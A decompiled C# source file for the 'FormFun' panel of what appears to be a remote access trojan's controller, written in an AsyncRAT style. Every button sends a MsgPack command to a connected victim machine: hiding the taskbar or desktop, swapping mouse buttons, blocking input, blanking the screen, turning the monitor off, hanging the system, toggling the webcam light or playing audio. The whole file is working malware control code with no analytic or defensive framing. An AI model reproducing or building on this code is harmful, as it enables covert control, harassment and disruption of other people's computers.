using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Siticone.Desktop.UI.WinForms;

namespace Server.Forms
{
	// Token: 0x02000090 RID: 144
	public partial class FormFun : Form
	{
		// Token: 0x0600044A RID: 1098 RVA: 0x00004457 File Offset: 0x00002657
		public FormFun()
		{
			this.InitializeComponent();
		}

		// Token: 0x170000B1 RID: 177
		// (get) Token: 0x0600044B RID: 1099 RVA: 0x00004465 File Offset: 0x00002665
		// (set) Token: 0x0600044C RID: 1100 RVA: 0x0000446D File Offset: 0x0000266D
		public FormMain F { get; set; }

		// Token: 0x170000B2 RID: 178
		// (get) Token: 0x0600044D RID: 1101 RVA: 0x00004476 File Offset: 0x00002676
		// (set) Token: 0x0600044E RID: 1102 RVA: 0x0000447E File Offset: 0x0000267E
		internal Clients Client { get; set; }

		// Token: 0x170000B3 RID: 179
		// (get) Token: 0x0600044F RID: 1103 RVA: 0x00004487 File Offset: 0x00002687
		// (set) Token: 0x06000450 RID: 1104 RVA: 0x0000448F File Offset: 0x0000268F
		internal Clients ParentClient { get; set; }

		// Token: 0x06000451 RID: 1105 RVA: 0x00029914 File Offset: 0x00027B14
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000452 RID: 1106 RVA: 0x00029960 File Offset: 0x00027B60
		private void button1_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000453 RID: 1107 RVA: 0x000299A8 File Offset: 0x00027BA8
		private void button2_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000454 RID: 1108 RVA: 0x000299F0 File Offset: 0x00027BF0
		private void button3_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Desktop+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000455 RID: 1109 RVA: 0x00029A38 File Offset: 0x00027C38
		private void button4_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Desktop-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000456 RID: 1110 RVA: 0x00029A80 File Offset: 0x00027C80
		private void button5_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Clock+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000457 RID: 1111 RVA: 0x00029AC8 File Offset: 0x00027CC8
		private void button6_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Clock-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000458 RID: 1112 RVA: 0x00029B10 File Offset: 0x00027D10
		private void button8_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "swapMouseButtons";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000459 RID: 1113 RVA: 0x00029B58 File Offset: 0x00027D58
		private void button7_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "restoreMouseButtons";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600045A RID: 1114 RVA: 0x00029BA0 File Offset: 0x00027DA0
		private void button10_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "openCD+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600045B RID: 1115 RVA: 0x00029BE8 File Offset: 0x00027DE8
		private void button9_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "openCD-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600045C RID: 1116 RVA: 0x00029C30 File Offset: 0x00027E30
		private void button18_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600045D RID: 1117 RVA: 0x00029C78 File Offset: 0x00027E78
		private void button17_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600045E RID: 1118 RVA: 0x00029CC0 File Offset: 0x00027EC0
		private void button11_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "blockInput";
			msgPack.ForcePathObject("Time").AsString = this.numericUpDown1.Value.ToString();
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600045F RID: 1119 RVA: 0x00029D28 File Offset: 0x00027F28
		private void button15_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "holdMouse";
			msgPack.ForcePathObject("Time").AsString = this.numericUpDown2.Value.ToString();
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000460 RID: 1120 RVA: 0x00029D90 File Offset: 0x00027F90
		private void button12_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "monitorOff";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000461 RID: 1121 RVA: 0x00029DD8 File Offset: 0x00027FD8
		private void button14_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "hangSystem";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000462 RID: 1122 RVA: 0x000024F0 File Offset: 0x000006F0
		private void button13_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000463 RID: 1123 RVA: 0x00004498 File Offset: 0x00002698
		private void FormFun_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}

		// Token: 0x06000464 RID: 1124 RVA: 0x00029E20 File Offset: 0x00028020
		private void button19_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight+";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000465 RID: 1125 RVA: 0x00029E68 File Offset: 0x00028068
		private void button16_Click(object sender, EventArgs e)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight-";
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000466 RID: 1126 RVA: 0x00029EB0 File Offset: 0x000280B0
		private void button13_Click_1(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "(*.wav)|*.wav";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] asBytes = File.ReadAllBytes(openFileDialog.FileName);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "playAudio";
					msgPack.ForcePathObject("wavfile").SetAsBytes(asBytes);
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				else
				{
					MessageBox.Show("Please choose a wav file.");
				}
			}
		}
	}
}
